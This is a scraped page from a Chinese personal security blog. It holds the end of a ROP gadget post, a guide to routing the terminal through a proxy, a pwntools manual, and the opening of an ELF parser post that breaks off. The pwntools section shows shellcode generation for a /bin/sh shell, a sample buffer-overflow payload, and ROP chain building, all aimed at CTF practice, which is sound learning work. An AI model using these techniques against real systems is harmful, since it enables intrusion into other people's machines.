<li>pop esi ; jmp dword [esi-0x70]</li>
</ul>
</li>
<li>COP（Call Oriented Programming）<ul>
<li>mov edx,dowrd [esp+0x48] ; call doword [eax+0x10]</li>
</ul>
</li>
</ul>
<h2 id="ROP-Gadget-搜索工具"><a href="#ROP-Gadget-搜索工具" class="headerlink" title="ROP Gadget 搜索工具"></a>ROP Gadget 搜索工具</h2><ul>
<li>ROPGadget<ul>
<li><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a></li>
</ul>
</li>
<li>rp<ul>
<li><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></li>
</ul>
</li>
<li>ropper<ul>
<li><a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">https://github.com/sashs/Ropper</a></li>
</ul>
</li>
<li>xrop<ul>
<li><a href="https://github.com/acama/xrop" target="_blank" rel="noopener">https://github.com/acama/xrop</a></li>
</ul>
</li>
</ul>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/21/Linux╚├╓╒╢╦╫▀┤·└φ╡─╝╕╓╓╖╜╖¿/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/04/21/Linux╚├╓╒╢╦╫▀┤·└φ╡─╝╕╓╓╖╜╖¿/" class="post-title-link" itemprop="url">Linux让终端走代理的几种方法</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-04-21 08:40:57" itemprop="dateCreated datePublished" datetime="2020-04-21T08:40:57-07:00">2020-04-21</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2020-04-26 19:56:58" itemprop="dateModified" datetime="2020-04-26T19:56:58-07:00">2020-04-26</time>
              </span>
            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Linux杂记/" itemprop="url" rel="index"><span itemprop="name">Linux杂记</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近使用终端git的时候觉得速度有点慢，考虑一下是不是可以通过让终端走代理的方式来加快速度，尝试了一下以后确实是可以的。如果只是为了设置git的话可以直接在文章最后找到git的设置代理的方法。</p>
<p><strong>前期准备:</strong></p>
<p>认识代理的方式:代理是通过客户端与服务端通信,传输服务端能够访问到的资源文件,再由服务端客户端通信返回给客户端,从而间接访问服务端能访问的资源.</p>
<p>以socket5通信为例子,我们通过客户端(自己想一想酸酸乳)向服务端发送socket通信,服务端访问资源再由socket通信返回给客户端.但是这里面的通信设置必须通过端口来进行通信,类似switchyomega设置过程一样,我们会设定走的代理方式是127.0.0.1:1080;这个意思就是通过本地的1080端口来进行通信.具体在终端上如何使用呢?</p>
<ul>
<li>如果默认是socket5通信且端口是1080,即127.0.01:1080的方式</li>
</ul>
<p>使用如下两种方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>

<p>这里无关自己代理客户端是不是酸酸乳或酸酸只要是通过socket通信即可,前提是满足已经能够正常代理访问.</p>
<ul>
<li>第二种是http代理,即通信方式为http而不是socket</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:12333</span><br></pre></td></tr></table></figure>

<h2 id="方法一：（推荐使用）"><a href="#方法一：（推荐使用）" class="headerlink" title="-方法一：（推荐使用）"></a>-方法一：（推荐使用）</h2><blockquote>
<p> 为什么说这个方法推荐使用呢？因为他只作用于当前终端中，不会影响环境，而且命令比较简单</p>
</blockquote>
<p>在终端中直接运行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=http://proxyAddress:port</span><br></pre></td></tr></table></figure>

<p>如果你是SSR,并且走的http的代理端口是12333，想执行wget或者curl来下载国外的东西，可以使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=http://127.0.0.1:12333</span><br></pre></td></tr></table></figure>

<p>如果是https那么就经过如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export https_proxy=http://127.0.0.1:12333</span><br></pre></td></tr></table></figure>

<h2 id="方法二-："><a href="#方法二-：" class="headerlink" title="方法二 ："></a>方法二 ：</h2><blockquote>
<p> 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了</p>
</blockquote>
<p>把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=&quot;http://localhost:port&quot;</span><br><span class="line">export https_proxy=&quot;http://localhost:port&quot;</span><br></pre></td></tr></table></figure>

<p>或者走socket5协议（ss,ssr）的话，代理端口是1080</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=&quot;socks5://127.0.0.1:1080&quot;</span><br><span class="line">export https_proxy=&quot;socks5://127.0.0.1:1080&quot;</span><br></pre></td></tr></table></figure>

<p>或者干脆直接设置ALL_PROXY</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export ALL_PROXY=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>

<p>最后在执行如下命令应用设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure>

<p>或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。</p>
<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias setproxy="export ALL_PROXY=socks5://127.0.0.1:1080" alias unsetproxy="unset ALL_PROXY"</span><br></pre></td></tr></table></figure>

<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三:"></a>方法三:</h2><p>改相应工具的配置，比如apt的配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/apt.conf</span><br></pre></td></tr></table></figure>

<p>在文件末尾加入下面这行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Acquire::http::Proxy &quot;http://proxyAddress:port&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 重点来了！！如果说经常使用git对于其他方面都不是经常使用，可以直接配置git的命令。</p>
</blockquote>
<h2 id="使用ss-ssr来加快git的速度"><a href="#使用ss-ssr来加快git的速度" class="headerlink" title="使用ss/ssr来加快git的速度"></a>使用ss/ssr来加快git的速度</h2><p>直接输入这个命令就好了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &apos;socks5://127.0.0.1:1080&apos; </span><br><span class="line">git config --global https.proxy &apos;socks5://127.0.0.1:1080&apos;</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/18/PWNTOOLS╕÷╚╦╩╓▓ß/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/04/18/PWNTOOLS╕÷╚╦╩╓▓ß/" class="post-title-link" itemprop="url">PWNTOOLS个人手册</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-04-18 01:48:38 / Geändert am: 16:48:56" itemprop="dateCreated datePublished" datetime="2020-04-18T01:48:38-07:00">2020-04-18</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>项目主页：<a href="http://pwntools.com/" target="_blank" rel="noopener">http://pwntools.com/</a></p>
<p>项目地址：<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">＃更新包</span><br><span class="line">sudo apt-get update</span><br><span class="line">＃安装必要的组件</span><br><span class="line">sudo apt-get install -y python2.7 python -pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">＃升级Python的包管理器</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">＃安装pwntools </span><br><span class="line">sudo pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>

<h2 id="模块列表"><a href="#模块列表" class="headerlink" title="模块列表"></a>模块列表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">- pwnlib.adb — Android Debug Bridge</span><br><span class="line">- pwnlib.asm — Assembler functions</span><br><span class="line">- pwnlib.encoders — Encoding Shellcode</span><br><span class="line">- pwnlib.elf — ELF Executables and Libraries</span><br><span class="line">- pwnlib.exception — Pwnlib exceptions</span><br><span class="line">- pwnlib.flag — CTF Flag Management</span><br><span class="line">- pwnlib.fmtstr — Format string bug exploitation tools</span><br><span class="line">- pwnlib.gdb — Working with GDB</span><br><span class="line">- pwnlib.log — Logging stuff</span><br><span class="line">- pwnlib.protocols — Wire Protocols</span><br><span class="line">- pwnlib.rop — Return Oriented Programming</span><br><span class="line">- pwnlib.runner — Running Shellcode</span><br><span class="line">- pwnlib.shellcraft — Shellcode generation</span><br><span class="line">- pwnlib.shellcraft.&lt;architecture&gt;</span><br><span class="line">- pwnlib.term — Terminal handling</span><br><span class="line">- pwnlib.timeout — Timeout handling</span><br><span class="line">- pwnlib.tubes — Talking to the World!</span><br><span class="line">- pwnlib.tubes.&lt;process|serialtube|SSH&gt;</span><br><span class="line">- pwnlib.update — Updating Pwntools</span><br><span class="line">- pwnlib.useragents — A database of useragent strings</span><br><span class="line">- pwnlib.util.cyclic — Generation of unique sequences</span><br><span class="line">- pwnlib.util.fiddling — Utilities bit fiddling</span><br><span class="line">- pwnlib.util.net — Networking interfaces</span><br><span class="line">- pwnlib.util.packing — Packing and unpacking of strings</span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure>

<h2 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h2><p><strong>常用模块如下：</strong></p>
<ul>
<li>asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台</li>
<li>dynelf : 用于远程符号泄漏，需要提供leak方法</li>
<li>elf : 对elf文件进行操作</li>
<li>gdb : 配合gdb进行调试</li>
<li>memleak : 用于内存泄漏</li>
<li>shellcraft : shellcode的生成器</li>
<li>tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</li>
<li>utils : 一些实用的小功能，例如CRC计算，cyclic pattern等</li>
</ul>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本地 ：sh = porcess(&quot;./level0&quot;)</span><br><span class="line">远程：sh = remote(&quot;127.0.0.1&quot;,10001)</span><br><span class="line">关闭连接：sh.close()</span><br></pre></td></tr></table></figure>

<p>pwn库中最常用的部分之一是，它允许您轻松地连接到Web服务并执行操作。pwntools的<a href="https://docs.pwntools.com/en/stable/intro.html" target="_blank" rel="noopener">入门文档</a>中包含的一个示例是连接到overthewire的 bandit CTF实验室。Overthewire是一款在线信息安全CTF通关网站，你可以在线Hacking,并为任何刚接触Linux / CLI 等的初级人员提供了手把手教学。<br>我们可以利用pwn库创建到主机的SSH连接，并对其运行任意命令。每个bandit级别的目标是找到进入下一级别的密码。例如：利用pwntools，您可以开发一个脚本来将SSH连接到目标主机，并运行一系列自动信息收集探针，以确定如何以最佳方式对其进行攻击。<br>一个不错的例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Connect to the target</span><br><span class="line">shell = ssh(&apos;bandit0&apos;, &apos;bandit.labs.overthewire.org&apos;, password=&apos;bandit0&apos;, port=2220)</span><br><span class="line"># Create an initial process</span><br><span class="line">sh = shell.run(&apos;sh&apos;)</span><br><span class="line"># Send the process arguments</span><br><span class="line">sh.sendline(&apos;ls -la&apos;)</span><br><span class="line"># Receive output from the executed command</span><br><span class="line">sh.recvline(timeout=5)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"># Obtain the first flag (password for bandit1)</span><br><span class="line">sh.sendline(&apos;cat readme&apos;)</span><br><span class="line"># Print the flag</span><br><span class="line">sh.recvline(timeout=5)</span><br></pre></td></tr></table></figure>

<h3 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sh.send(data)  发送数据</span><br><span class="line">sh.sendline(data)  发送一行数据，相当于在数据后面加\n</span><br><span class="line">sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil(&quot;Hello,World\n&quot;,drop=fasle)  接受数据直到我们设置的标志出现</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout = default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br></pre></td></tr></table></figure>

<h3 id="汇编和反汇编"><a href="#汇编和反汇编" class="headerlink" title="汇编和反汇编"></a>汇编和反汇编</h3><p>汇编：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; asm(&apos;nop&apos;)</span><br><span class="line">&apos;\x90&apos;</span><br><span class="line">&gt;&gt;&gt; asm(&apos;nop&apos;, arch=&apos;arm&apos;)</span><br><span class="line">&apos;\x00\xf0 \xe3&apos;</span><br></pre></td></tr></table></figure>

<p>可以使用context来指定cpu类型以及操作系统。context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; context.arch      = &apos;i386&apos;</span><br><span class="line">&gt;&gt;&gt; context.os        = &apos;linux&apos;</span><br><span class="line">&gt;&gt;&gt; context.endian    = &apos;little&apos;</span><br><span class="line">&gt;&gt;&gt; context.word_size = 32</span><br></pre></td></tr></table></figure>

<p>一般来说我们设置context只需要简单的一句话:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</span><br></pre></td></tr></table></figure>

<p>使用disasm进行反汇编</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print disasm(&apos;6a0258cd80ebf9&apos;.decode(&apos;hex&apos;))</span><br><span class="line">   0:   6a 02                   push   0x2</span><br><span class="line">   2:   58                      pop    eax</span><br><span class="line">   3:   cd 80                   int    0x80</span><br><span class="line">   5:   eb f9                   jmp    0x0</span><br></pre></td></tr></table></figure>

<p>注意，asm需要binutils中的as工具辅助，如果是不同于本机平台的其他平台的汇编，例如在我的x86机器上进行mips的汇编就会出现as工具未找到的情况，这时候需要安装其他平台的cross-binutils</p>
<h3 id="shellcode生成器"><a href="#shellcode生成器" class="headerlink" title="shellcode生成器"></a>shellcode生成器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print shellcraft.i386.nop().strip(&apos;\n&apos;)</span><br><span class="line">    nop</span><br><span class="line">&gt;&gt;&gt; print shellcraft.i386.linux.sh()</span><br><span class="line">    /* push &apos;/bin///sh\x00&apos; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>结合asm可以可以得到最终的pyaload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&apos;linux&apos;,arch=&apos;amd64&apos;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br></pre></td></tr></table></figure>

<p>除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等</p>
<h4 id="ELF文件操作"><a href="#ELF文件操作" class="headerlink" title="ELF文件操作"></a>ELF文件操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)</span><br><span class="line">&gt;&gt;&gt; print hex(e.address)  # 文件装载的基地址</span><br><span class="line">0x400000</span><br><span class="line">&gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # 函数地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOT表的地址</span><br><span class="line">0x60b070</span><br><span class="line">&gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLT的地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.search(&apos;/bin/sh&apos;).next())# 字符串/bin/sh的地址</span><br></pre></td></tr></table></figure>

<h3 id="整数pack与数据unpack"><a href="#整数pack与数据unpack" class="headerlink" title="整数pack与数据unpack"></a>整数pack与数据unpack</h3><p>pack：p32，p64<br>unpack：u32，u64</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&apos;./level0&apos;)</span><br><span class="line">sys_addr = elf.symbols[&apos;system&apos;]</span><br><span class="line">payload = &apos;a&apos; * (0x80 + 0x8) + p64(sys_addr)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>还可以调整大端序和小端序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Create some variable with an address</span><br><span class="line">addr = 0xabcdef12</span><br><span class="line"># 32-bit: Big Endian</span><br><span class="line">p32(addr, endian=&quot;big&quot;</span><br><span class="line"># 32-bit: Little Endian</span><br><span class="line">p32(addr, endian=&quot;big&quot;</span><br><span class="line"># 32-bit: Default is Little Endian</span><br><span class="line">p32(addr)</span><br><span class="line"># 64-bit: Big Endian</span><br><span class="line">p64(addr, endian=&quot;big&quot;)</span><br><span class="line"># 64-bit: Little Endian</span><br><span class="line">p64(addr, endian=&quot;small&quot;)</span><br><span class="line"># 64-bit: Default is Little Endian</span><br><span class="line">p64(addr)</span><br></pre></td></tr></table></figure>

<h3 id="ROP链生成器"><a href="#ROP链生成器" class="headerlink" title="ROP链生成器"></a>ROP链生成器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(&apos;ropasaurusrex&apos;)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop.read(0, elf.bss(0x80))</span><br><span class="line">rop.dump()</span><br><span class="line"># [&apos;0x0000:        0x80482fc (read)&apos;,</span><br><span class="line">#  &apos;0x0004:       0xdeadbeef&apos;,</span><br><span class="line">#  &apos;0x0008:              0x0&apos;,</span><br><span class="line">#  &apos;0x000c:        0x80496a8&apos;]</span><br><span class="line">str(rop)</span><br><span class="line"># &apos;\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08&apos;</span><br></pre></td></tr></table></figure>

<p>使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数。</p>
<p>因为ROP对象实现了<strong>getattr</strong>的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。<br> 通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。</p>
<ul>
<li>call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</li>
<li>chain() : 返回当前的字节序列，即payload</li>
<li>dump() : 直观地展示出当前的rop chain</li>
<li>raw() : 在rop chain中加上一个整数或字符串</li>
<li>search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget</li>
<li>unresolve(value) : 给出一个地址，反解析出符号</li>
</ul>
<h3 id="数据输出"><a href="#数据输出" class="headerlink" title="数据输出"></a>数据输出</h3><p>如果需要输出一些信息,最好使用pwntools自带的,因为和pwntools本来的格式吻合,看起来也比较舒服,用法:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">some_str = &quot;hello, world&quot;</span><br><span class="line">log.info(some_str)</span><br></pre></td></tr></table></figure>

<p>其中的info代表是log等级，也可以使用其他log等级</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/12/┤╙└φ╜ΓELF╡╜╩╓╨┤Readelf╜Γ╬÷╞≈ú¿╥╗ú⌐/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/04/12/┤╙└φ╜ΓELF╡╜╩╓╨┤Readelf╜Γ╬÷╞≈ú¿╥╗ú⌐/" class="post-title-link" itemprop="url">从理解ELF到手写Readelf解析器（一）</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-04-12 04:36:31 / Geändert am: 19:38:18" itemprop="dateCreated datePublished" datetime="2020-04-12T04:36:31-07:00">2020-04-12</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>（本文所有代码均基于Go语言，ELF文件为32位）</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人普通大二学生水平有限，可能错误许多的，还希望大佬们能帮指证修改</p>
<p>项目地址：<a href="https://github.com/suyucheng-lz/ELF32_Read" target="_blank" rel="noopener">https://github.com/suyucheng-lz/ELF32_Read</a></p>
<h2 id="目前实现的效果"><a href="#目前实现的效果" class="headerlink" title="目前实现的效果"></a>目前实现的效果</h2><h3 id="readelf的解析数据："><a href="#readelf的解析数据：" class="headerlink" title="readelf的解析数据："></a>readelf的解析数据：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 